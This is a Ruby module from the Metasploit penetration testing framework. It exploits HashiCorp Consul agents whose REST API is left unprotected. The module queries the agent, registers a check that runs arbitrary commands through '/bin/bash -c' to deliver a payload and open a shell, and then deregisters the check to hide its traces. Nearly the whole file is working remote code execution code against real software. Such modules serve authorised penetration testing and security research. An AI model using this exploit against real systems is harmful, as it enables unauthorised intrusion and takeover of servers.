##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Consul Agent check script execution',
      'Description'     => %q{
        Consul Agent can allow to execute checks regularly. These checks are actually command line.
        By default, the REST API is not protected and anybody can push new checks.
        If the REST API is protected, a token is needed to push new checks.
        See https://www.consul.io/api/agent/check.html for the complete documentation.
      },
      'Author'          => [ 'Julien Legras <julien.legras@synacktiv.com>'],
      'License'         => MSF_LICENSE,
      'Privileged'      => false,
      'DisclosureDate'  => 'Aug 31 2018',
      'Platform'        => 'linux',
      'Targets'         => [ [ 'Linux', {} ] ],
      'DefaultTarget'   => 0))

    register_options([
      OptString.new('PATH', [true, "The PATH where the Consul Agent API is located", "/"]),
      OptString.new('CHECK_NAME', [true, "The Consul Agent check name", rand_text_alphanumeric(20)]),
      OptString.new('ACL_TOKEN', [false, "The Consul Agent ACL token (called acl_master_token)", ""]),
      Opt::RPORT(8500)
    ])
  end

  def register_check(name: datastore['CHECK_NAME'], shell: "/bin/bash", args: [], interval: "1s", timeout: "86400s")
    response = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(datastore['PATH'], "/v1/agent/self"),
      'headers'   => {
        'X-Consul-Token' => datastore['ACL_TOKEN']
      }
    })

    use_new_api = true
    if response and response.code == 200
      begin
        agent_info = JSON.parse(response.body)

        use_new_api = Gem::Version.new(agent_info["Config"]["Version"]) > Gem::Version.new("1.0.0")
      rescue JSON::ParserError
        fail_with(Failure::Unknown, 'Failed to parse JSON output.')
      end
    end

    data = { 'ID' => datastore['CHECK_NAME'], 'Name' => datastore['CHECK_NAME'], "Interval" => interval, "Timeout" => timeout}
    if use_new_api
      data.merge!({ "Shell" => shell, "Args" => args })
    else
      data.merge!({ "Script" => args.map { |s| '"' + s + '"' }.join(" ") })
    end
    response = send_request_cgi({
      'uri'       => normalize_uri(datastore['PATH'], '/v1/agent/check/register'),
      'method'    => 'PUT',
      'data'      => data.to_json,
      'headers'   => {
        'Content-Type'   => 'application/json',
        'X-Consul-Token' => datastore['ACL_TOKEN']
      }
    })

    return response
  end

  def deregister_check()
    return send_request_cgi({
      'uri'       => normalize_uri(datastore['PATH'], '/v1/agent/check/deregister/', datastore['CHECK_NAME']),
      'method'    => 'PUT',
      'headers'   => {
        'Content-Type'   => 'application/json',
        'X-Consul-Token' => datastore['ACL_TOKEN']
      }
    })
  end

  def check
    response = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(datastore['PATH'], "/v1/agent/self"),
      'headers'   => {
        'X-Consul-Token' => datastore['ACL_TOKEN']
      }
    })

    if response and response.code == 200
      begin
        agent_info = JSON.parse(response.body)

        return Exploit::CheckCode::Vulnerable if agent_info["DebugConfig"]["EnableScriptChecks"] == true
        return Exploit::CheckCode::Safe
      rescue JSON::ParserError
        fail_with(Failure::Unknown, 'Failed to parse JSON output.')
      end
    end

    return Exploit::CheckCode::Unknown
  end

  def on_new_session(session)
    response = deregister_check()
    if response and response.code != 200
      print_error("Failed to deregister the check #{datastore['CHECK_NAME']}")
    end
  end


  def execute_command(cmd, opts = {})
    response = register_check(args: ['/bin/bash', '-c', cmd])

    if response.code == 200
      print_good("The shell is on the way!")
    else
      print_error("Something went wrong...")
      print_status(response.body.to_s)
    end
  end

  def exploit
    execute_cmdstager()
  end
end

